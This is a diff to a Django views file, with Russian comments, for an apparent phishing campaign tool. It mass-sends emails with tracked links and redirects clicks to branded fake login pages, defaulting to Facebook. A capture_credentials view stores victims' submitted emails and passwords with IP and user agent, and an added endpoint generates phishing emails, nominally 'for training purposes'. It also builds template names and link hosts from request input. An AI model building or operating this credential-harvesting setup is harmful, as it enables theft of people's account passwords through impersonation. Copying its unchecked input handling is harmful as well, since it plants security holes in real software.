@@ -10,11 +10,16 @@ from django.http import JsonResponse
 from django.utils.timezone import now
 from django.views.decorators.csrf import csrf_exempt
 from django.conf import settings
+from .utils import generate_phishing_email
+from django.urls import reverse
+import threading
+from rest_framework.decorators import api_view
 
 logger = logging.getLogger(__name__)
 
-def login_template_view(request, recipient_id, message_id):
-    return render(request, "email_templates/Facebook.html", {"recipient_id": recipient_id, "message_id": message_id})
+def login_template_view(request, recipient_id, message_id, platform):
+    template_name = f"email_templates/{platform.capitalize()}.html"
+    return render(request, template_name, {"recipient_id": recipient_id, "message_id": message_id, "platform": platform})
 
 
 class ClickLogViewSet(viewsets.ReadOnlyModelViewSet):
@@ -36,10 +41,10 @@ class RecipientGroupViewSet(viewsets.ModelViewSet):
     @action(detail=True, methods=['post'])
     def add_recipient(self, request, pk=None):
         group = self.get_object()
-        recipient_id = request.data.get('recipient_id')
+        recipient_id = request.data.get('recipient_id') 
 
         try:
-            recipient = Recipient.objects.get(id=recipient_id)
+            recipient = Recipient.objects.get(id=recipient_id) 
         except Recipient.DoesNotExist:
             logger.error(f"Recipient with ID {recipient_id} not found.")
             return Response({"detail": "Recipient not found."}, status=404)
@@ -70,7 +75,6 @@ class RecipientGroupViewSet(viewsets.ModelViewSet):
         logger.info(f"Group {group.name} deleted successfully.")
         return Response(status=204)
 
-
 class RecipientViewSet(viewsets.ModelViewSet):
     queryset = Recipient.objects.all()
     serializer_class = RecipientSerializer
@@ -86,7 +90,6 @@ class RecipientViewSet(viewsets.ModelViewSet):
         logger.error(f"Error updating recipient {recipient.email}: {serializer.errors}")
         return Response(serializer.errors, status=400)
 
-
     @action(detail=True, methods=['delete'])
     def delete_recipient(self, request, pk=None):
         recipient = self.get_object()
@@ -95,18 +98,26 @@ class RecipientViewSet(viewsets.ModelViewSet):
         return Response({"message": "Recipient deleted successfully."}, status=204)
 
 
+def send_email_async(email):
+    email.send()
+
 class MessageViewSet(viewsets.ModelViewSet):
     queryset = Message.objects.all()
     serializer_class = MessageSerializer
 
     @action(detail=False, methods=['post'])
-    def send_message(self, request):
+    def preview(self, request):
+        """
+        Этот эндпоинт создаёт черновик сообщения (но не сохраняет его в БД) 
+        и возвращает данные для предпросмотра.
+        """
         sender_id = request.data.get("sender")
         group_id = request.data.get("recipient_group")
         campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
         subject = request.data.get("subject")
         body = request.data.get("body")
-        use_template = request.data.get("use_template", False)
+        platform = request.data.get("platform", "facebook")
+        host = request.data.get("host", settings.BASE_URL)
 
         try:
             sender = Sender.objects.get(id=sender_id)
@@ -117,7 +128,47 @@ class MessageViewSet(viewsets.ModelViewSet):
             return Response({"detail": "Recipient Group not found."}, status=404)
 
         recipients = group.recipients.all()
+        if not recipients:
+            return Response({"detail": "No recipients in the group."}, status=400)
 
+        recipient_id = recipients[0].id  # Берём первого получателя
+
+        tracking_link = f"{host}{reverse('track_click', args=[recipient_id, '0', platform])}"
+
+        message_data = {
+            "sender": sender.id,
+            "recipient_group": group.id,
+            "campaign_name": campaign_name,
+            "subject": subject,
+            "body": f"{body}\n\n🔗 Click here: {tracking_link}",
+        }
+
+        return Response({
+            "message": message_data,
+            "recipient_id": recipient_id
+        }, status=200)
+
+    @action(detail=False, methods=['post'])
+    def send_message(self, request):
+        print("send_message вызван")
+        sender_id = request.data.get("sender")
+        group_id = request.data.get("recipient_group")
+        campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
+        subject = request.data.get("subject")
+        body = request.data.get("body")
+        use_template = request.data.get("use_template", False)
+        platform = request.data.get("platform", "facebook")  
+        host = request.data.get("host", settings.BASE_URL)
+
+        try:
+            sender = Sender.objects.get(id=sender_id)
+            group = RecipientGroup.objects.get(id=group_id)
+        except Sender.DoesNotExist:
+            return Response({"detail": "Sender not found."}, status=404)
+        except RecipientGroup.DoesNotExist:
+            return Response({"detail": "Recipient Group not found."}, status=404)
+
+        recipients = group.recipients.all()
         if not recipients:
             return Response({"detail": "No recipients in the group."}, status=400)
 
@@ -138,15 +189,16 @@ class MessageViewSet(viewsets.ModelViewSet):
                 campaign_name=campaign_name,
                 subject=subject,
                 body=body,
-                link=None  # Заполним позже
+                link=None,
+                host=host  
             )
 
             message.recipients.set(recipients)
 
             for recipient in recipients:
-                tracking_link = f"{settings.BASE_URL}/track/{recipient.id}/{message.id}/"  # <-- Передаем message_id
+                tracking_link = f"{host}{reverse('track_click', args=[recipient.id, message.id, platform])}"
 
-                email_body = f"{body}\n\n🔗 Click here: {tracking_link}" if use_template else body
+                email_body = f"{body}\n\n🔗 Click here: {tracking_link}" if use_template else f"{body}\n\n{tracking_link}"
 
                 email = EmailMessage(
                     subject=subject,
@@ -156,10 +208,13 @@ class MessageViewSet(viewsets.ModelViewSet):
                     connection=connection
                 )
 
-                email.send()
+                thread = threading.Thread(target=send_email_async, args=(email,))
+                thread.start()
 
-            message.link = f"{settings.BASE_URL}/track/{recipients[0].id}/{message.id}/"
+            message.link = f"{host}{reverse('track_click', args=[recipients[0].id, message.id, platform])}"
             message.save()
+
+            print("Сообщение сохранено в БД:", message.id)
 
             return Response({"status": "Messages sent successfully"}, status=201)
 
@@ -167,37 +222,34 @@ class MessageViewSet(viewsets.ModelViewSet):
             return Response({"detail": f"Email sending failed: {str(e)}"}, status=500)
 
 
-
-def track_click(request, recipient_id, message_id):
+def track_click(request, recipient_id, message_id, platform):
     ip = get_client_ip(request)
     user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
 
     try:
         recipient = Recipient.objects.get(id=recipient_id)
-        message = Message.objects.get(id=message_id)  # <-- Получаем кампанию
+        message = Message.objects.get(id=message_id)
     except Recipient.DoesNotExist:
         return JsonResponse({"error": "Recipient not found"}, status=404)
     except Message.DoesNotExist:
         return JsonResponse({"error": "Message not found"}, status=404)
 
-    # Проверяем, был ли уже зарегистрирован клик для этой кампании и пользователя
-    existing_click = ClickLog.objects.filter(recipient=recipient, message=message).exists()
+    existing_click = ClickLog.objects.filter(recipient=recipient, message=message, platform=platform).exists()
 
     if not existing_click:
         ClickLog.objects.create(
             recipient=recipient,
-            message=message,  # <-- Сохраняем кампанию
+            message=message,
+            platform=platform,
             ip_address=ip,
             user_agent=user_agent,
             timestamp=now()
         )
 
-    return redirect(f"/email-template/{recipient_id}/{message_id}/") 
+    return redirect(f"/login-template/{recipient_id}/{message_id}/{platform}/")
 
 
-
-
-def capture_credentials(request, recipient_id, message_id):
+def capture_credentials(request, recipient_id, message_id, platform):
     
     if request.method == "POST":
         email = request.POST.get("email")
@@ -218,7 +270,8 @@ def capture_credentials(request, recipient_id, message_id):
             password=password,
             ip_address=ip,
             user_agent=user_agent,
-            timestamp=now()
+            timestamp=now(),
+            platform=platform,
         )
 
         return JsonResponse({"status": "success"}, status=200)
@@ -233,7 +286,6 @@ def get_client_ip(request):
     else:
         ip = request.META.get('REMOTE_ADDR')
     return ip
-
 
 
 @csrf_exempt
@@ -285,3 +337,14 @@ def send_test_email(request):
             return JsonResponse({"error": str(e)}, status=500)
 
     return JsonResponse({"error": "Invalid request method"}, status=400)
+
+def generate_email_view(request):
+    prompt = "Generate a phishing email for training purposes."
+    phishing_email = generate_phishing_email(prompt)
+    return JsonResponse(
+        {"phishing_email": phishing_email},
+        json_dumps_params={"indent": 4}
+    )
+
+
+
